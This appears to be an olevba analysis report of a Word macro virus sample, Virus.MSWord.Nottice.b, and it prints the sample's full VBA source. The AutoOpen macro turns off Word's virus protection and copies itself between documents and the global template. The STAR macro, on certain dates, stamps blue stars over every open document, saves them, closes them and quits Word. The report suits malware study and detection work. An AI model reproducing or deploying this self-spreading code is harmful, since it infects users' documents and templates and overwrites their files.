olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.b-62b4095b4aa46cf62a22da8544f28a1537834d29
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.b-62b4095b4aa46cf62a22da8544f28a1537834d29 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.b-62b4095b4aa46cf62a22da8544f28a1537834d29 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Star"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Application.Options.VirusProtection = False
WordBasic.Call "STAR"
Dim D$
On Error GoTo ControlErrors
WordBasic.DisableAutoMacros 0
D$ = UCase(Right$(WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If D$ = "NORMAL.DOT" Then
 If insideDoc = 0 Then killDOC
Else
 If insideGlobal = 0 Then killGlobal
End If
ControlErrors:
End Sub
Private Function insideDoc()
Dim i
insideDoc = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
                If WordBasic.[MacroName$](i, 1) = "STAR" Then
                             insideDoc = 1
        End If
    Next i
End If
End Function
Private Function insideGlobal()
Dim i
insideGlobal = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
                If WordBasic.[MacroName$](i, 0) = "STAR" Then
                             insideGlobal = 1
        End If
    Next i
End If
End Function
Private Sub killDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:STAR", WordBasic.[FileName$]() + ":STAR"
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub killGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":STAR", "Global:STAR"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO STAR.bas 
in file: Virus.MSWord.Nottice.b-62b4095b4aa46cf62a22da8544f28a1537834d29 - OLE stream: 'Macros/VBA/STAR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Star"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.STAR.MAIN"
 If (WordBasic.Day(WordBasic.Now()) = 5) Or (WordBasic.Day(WordBasic.Now()) = 20) Or (WordBasic.Day(WordBasic.Now()) = 30) Then
  Application.OnTime When:=Now + TimeValue("00:05:00"), Name:="STAR.PaintStar"
 End If
End Sub
Sub PaintStar()
Attribute PaintStar.VB_Description = "Star"
Attribute PaintStar.VB_ProcData.VB_Invoke_Func = "Normal.STAR.PaintStar"
Dim Vx, Vy, W, H
On Error GoTo FatalError
Application.WindowState = wdWindowStateMinimize
For Each Docu In Documents
 Docu.PageSetup.PaperSize = wdPaperA4Small
 Docu.PageSetup.Orientation = wdOrientLandscape
 W = Int(Docu.PageSetup.PageWidth / 2)
 H = Int(Docu.PageSetup.PageHeight / 2)
 For i = 0 To 6.28 Step 0.6
   Vx = W + Int((200 * Sin(i))): Vy = H - Int((200 * Cos(i)))
  With Docu.Shapes.AddShape(msoShape5pointStar, Vx, Vy, 50, 50).Fill
   .ForeColor.RGB = RGB(0, 0, 255)
   .BackColor.RGB = RGB(0, 0, 255)
  End With
  Beep
 Next i
 Docu.Save
Next Docu
For Each Docu In Documents
 Docu.Close
Next Docu
FatalError:
 Application.Quit SaveChanges:=wdDotNoSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

